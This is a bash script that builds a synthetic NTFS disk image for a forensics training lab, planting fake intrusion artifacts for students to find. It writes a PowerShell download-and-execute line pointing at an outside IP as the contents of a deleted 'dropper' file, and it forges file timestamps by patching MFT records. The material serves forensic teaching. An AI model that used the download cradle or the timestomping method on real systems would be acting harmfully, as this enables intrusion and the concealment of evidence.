#!/usr/bin/env bash
# build-image.sh — reproducibly build the SYNTHETIC training disk image for Module 15.
#
# WHY THIS EXISTS / HONESTY NOTE
# ------------------------------------------------------------------------------
# The image this script produces is a small, PURPOSE-BUILT NTFS volume created by
# the lab authors — it is NOT a dump of a real victim machine. It re-uses the
# characters/host of the lab's running narrative (DFIR Madness "Stolen Szechuan
# Sauce": host DESKTOP-SDN1RPT, user mortysmith, malware coreupdater.exe) so it
# threads with Modules 1-4, but every byte here is synthetic and safe. Shipping
# the generator (this file) makes the evidence fully transparent and regenerable
# — itself a DFIR good-practice lesson: know exactly what your evidence is.
#
# The image deliberately contains, with KNOWN ground truth:
#   * a partition table (one NTFS partition at sector 2048)            -> mmls
#   * a benign Windows/User baseline                                   -> fls
#   * coreupdater.exe : a dropped C2 backdoor, TIMESTOMPED              -> istat ($SI vs $FN)
#   * a genuinely-old, NOT-stomped system file (win32k.sys)            -> istat contrast
#   * two DELETED attacker artifacts (a .ps1 dropper, a .zip exfil)    -> fls -d / icat recovery
#
# REQUIREMENTS (run on a Linux host, not inside the analysis container):
#   sudo, parted, util-linux (losetup), ntfs-3g (mkntfs/mount), attr (setfattr),
#   python3, and Docker with image dfir-aio:v2 (for the post-build verification).
#
# Usage:   sudo bash build-image.sh        # writes ./disk-DESKTOP-SDN1RPT.raw and ./MFT
set -eu

HERE="$(cd "$(dirname "$0")" && pwd)"
IMG="$HERE/disk-DESKTOP-SDN1RPT.raw"
MFT_OUT="$HERE/MFT"
WORK="$(mktemp -d)"
MNT="$WORK/mnt"; mkdir -p "$MNT"
cleanup(){ sudo umount "$MNT" 2>/dev/null || true; [ -n "${LOOP:-}" ] && sudo losetup -d "$LOOP" 2>/dev/null || true; rm -rf "$WORK"; }
trap cleanup EXIT

# ---- NTFS timestamp helper (prints a big-endian hex blob of 4 FILETIMEs) -----
# order matches ntfs-3g system.ntfs_times_be: Created, Modified, (MFT-change), Accessed.
ntimes(){ python3 - "$@" <<'PY'
import sys,struct,datetime
def ft(s):
    # "YYYY-MM-DD HH:MM:SS.fffffff" (7-digit 100ns frac optional) -> NTFS FILETIME
    if '.' in s: base,frac=s.split('.'); frac=(frac+'0000000')[:7]
    else: base,frac=s,'0000000'
    dt=datetime.datetime.strptime(base,'%Y-%m-%d %H:%M:%S').replace(tzinfo=datetime.timezone.utc)
    epoch=int(dt.timestamp()); return (epoch+11644473600)*10**7+int(frac)
vals=[ft(a) for a in sys.argv[1:5]]
sys.stdout.write(b''.join(struct.pack('>Q',v) for v in vals).hex())
PY
}
setsi(){ # setsi <path> <created> <modified> <accessed>   (sets $SI; $FN follows)
  local p="$1"; local h; h="$(ntimes "$2" "$3" "$2" "$4")"
  sudo setfattr -h -v "0x$h" -n system.ntfs_times_be "$p"
}

echo "[*] Creating 10 MiB raw image + MBR partition table (NTFS @ sector 2048)"
rm -f "$IMG"
dd if=/dev/zero of="$IMG" bs=1M count=10 status=none
parted -s "$IMG" mklabel msdos
parted -s "$IMG" mkpart primary ntfs 2048s 100%
parted -s "$IMG" set 1 boot on
LOOP="$(sudo losetup --find --show -P "$IMG")"
sudo mkntfs -Q -F -L "OSDISK" "${LOOP}p1" >/dev/null 2>&1
sudo mount -t ntfs-3g "${LOOP}p1" "$MNT"

echo "[*] Populating benign baseline"
sudo mkdir -p "$MNT/Windows/System32" "$MNT/Windows/Temp" \
              "$MNT/Users/mortysmith/Documents" "$MNT/Users/mortysmith/Desktop" \
              "$MNT/Users/mortysmith/Downloads" \
              "$MNT/Users/mortysmith/AppData/Local/Temp"
printf 'MZ\x90\x00 win32k.sys (benign OS driver, build 2019)\n'   | sudo tee "$MNT/Windows/System32/win32k.sys"  >/dev/null
printf 'MZ\x90\x00 cmd.exe (benign Windows shell)\n'              | sudo tee "$MNT/Windows/System32/cmd.exe"     >/dev/null
printf 'Q3 secret-sauce vendor list and costs.\n'                | sudo tee "$MNT/Users/mortysmith/Documents/Q3_recipes.xlsx" >/dev/null
printf 'Reminder: water the plants. Re-up Crunchwrap supply.\n'  | sudo tee "$MNT/Users/mortysmith/Desktop/notes.txt" >/dev/null

echo "[*] Dropping the malicious artifacts (ground-truth intrusion: 2026-06-15)"
# C2 backdoor -- KEPT on disk, will be timestomped below
printf 'MZ\x90\x00\x03 coreupdater.exe :: C2 beacon implant :: Stolen-Szechuan-Sauce campaign\n' \
  | sudo tee "$MNT/Windows/Temp/coreupdater.exe" >/dev/null
# PowerShell dropper -- will be DELETED
printf "IEX (New-Object Net.WebClient).DownloadString('http://45.77.13.37/c2.ps1')  # stage-2 loader\n" \
  | sudo tee "$MNT/Users/mortysmith/AppData/Local/Temp/update.ps1" >/dev/null
# Exfil archive -- >1 cluster so it is NON-resident (real cluster carving), will be DELETED
{ printf 'PK\x03\x04'; for i in $(seq 1 220); do printf 'STOLEN: szechuan sauce formula row %03d ,sweet,umami,secret\n' "$i"; done; } \
  | sudo tee "$MNT/Users/mortysmith/Downloads/loot.zip" >/dev/null

echo "[*] Setting timestamps (UTC) to a coherent story timeline"
# benign baseline -- a couple of weeks before the intrusion, natural sub-second precision
setsi "$MNT/Users/mortysmith/Documents/Q3_recipes.xlsx" "2026-05-20 14:02:11.7731002" "2026-06-10 16:45:09.1180044" "2026-06-14 08:01:55.5510077"
setsi "$MNT/Users/mortysmith/Desktop/notes.txt"         "2026-05-22 19:10:03.4420511" "2026-05-22 19:10:03.4420511" "2026-06-14 08:02:10.0090123"
# genuinely-OLD OS files: $SI AND $FN both 2019 and CONSISTENT -> looks old AND is old (NOT stomped)
setsi "$MNT/Windows/System32/win32k.sys" "2019-03-15 08:34:21.7654321" "2019-03-15 08:34:21.7654321" "2026-06-14 03:11:02.6610923"
setsi "$MNT/Windows/System32/cmd.exe"    "2019-03-15 08:34:19.1234567" "2019-03-15 08:34:19.1234567" "2026-06-14 03:11:02.7710233"
# attacker artifacts -- real creation in the intrusion window (these two are NOT stomped, just deleted)
setsi "$MNT/Users/mortysmith/AppData/Local/Temp/update.ps1" "2026-06-15 09:10:05.3312044" "2026-06-15 09:10:05.3312044" "2026-06-15 09:10:06.0011002"
setsi "$MNT/Users/mortysmith/Downloads/loot.zip"            "2026-06-15 09:20:15.8890231" "2026-06-15 09:20:16.1120553" "2026-06-15 09:20:16.4410090"
# coreupdater.exe -- TIMESTOMP $SI to whole-second 2019 (the lie). $FN patched to real 2026 AFTER unmount.
setsi "$MNT/Windows/Temp/coreupdater.exe" "2019-03-15 12:00:00" "2019-03-15 12:00:00" "2019-03-15 12:00:00"

echo "[*] Deleting the two artifacts the attacker tried to wipe (recoverable)"
sudo rm "$MNT/Users/mortysmith/AppData/Local/Temp/update.ps1"
sudo rm "$MNT/Users/mortysmith/Downloads/loot.zip"

sync
sudo umount "$MNT"
sudo losetup -d "$LOOP"; LOOP=""

echo "[*] Locating coreupdater.exe MFT entry to byte-patch its \$FILE_NAME timestamps"
INODE="$(docker run --rm --network none -v "$HERE":/d dfir-aio:v2 \
         sh -c 'fls -o 2048 -r /d/disk-DESKTOP-SDN1RPT.raw | grep coreupdater | sed -E "s/.* ([0-9]+)-.*/\1/"')"
echo "    coreupdater.exe = MFT entry $INODE"

python3 - "$IMG" "$INODE" <<'PY'
import sys,struct,datetime
img,inode=sys.argv[1],int(sys.argv[2])
PART=2048*512; MFT_CLUSTER=4; CLUSTER=4096; REC=1024
rec_off=PART+MFT_CLUSTER*CLUSTER+inode*REC
def ft(s):
    base,frac=s.split('.'); frac=(frac+'0000000')[:7]
    dt=datetime.datetime.strptime(base,'%Y-%m-%d %H:%M:%S').replace(tzinfo=datetime.timezone.utc)
    return (int(dt.timestamp())+11644473600)*10**7+int(frac)
# real creation/modify the kernel would have stamped into $FN (precise sub-seconds, 2026)
created =struct.pack('<Q',ft('2026-06-15 09:12:33.4567890'))
modified=struct.pack('<Q',ft('2026-06-15 09:12:33.4567890'))
changed =struct.pack('<Q',ft('2026-06-15 09:12:33.5120044'))
accessed=struct.pack('<Q',ft('2026-06-15 09:12:34.0010222'))
with open(img,'r+b') as f:
    f.seek(rec_off); rec=bytearray(f.read(REC))
    assert rec[0:4]==b'FILE', 'not an MFT record'
    off=struct.unpack_from('<H',rec,0x14)[0]   # first attribute
    patched=0
    while off+8<=REC:
        atype=struct.unpack_from('<I',rec,off)[0]
        if atype==0xFFFFFFFF: break
        alen=struct.unpack_from('<I',rec,off+4)[0]
        if alen==0: break
        if atype==0x30:  # $FILE_NAME (resident)
            coff=struct.unpack_from('<H',rec,off+0x14)[0]
            c=off+coff
            rec[c+0x08:c+0x10]=created
            rec[c+0x10:c+0x18]=modified
            rec[c+0x18:c+0x20]=changed
            rec[c+0x20:c+0x28]=accessed
            patched+=1
        off+=alen
    assert patched>0, 'no $FILE_NAME attribute found'
    f.seek(rec_off); f.write(rec)
print("    patched %d $FILE_NAME attribute(s) at image offset %d" % (patched, rec_off))
PY

echo "[*] Extracting the \$MFT for the MFTECmd exercise"
docker run --rm --network none -v "$HERE":/d dfir-aio:v2 \
  sh -c 'icat -o 2048 /d/disk-DESKTOP-SDN1RPT.raw 0 > /d/MFT'

echo "[+] Done."
echo "    image : $IMG ($(du -h "$IMG" | cut -f1))"
echo "    \$MFT  : $MFT_OUT ($(du -h "$MFT_OUT" | cut -f1))"
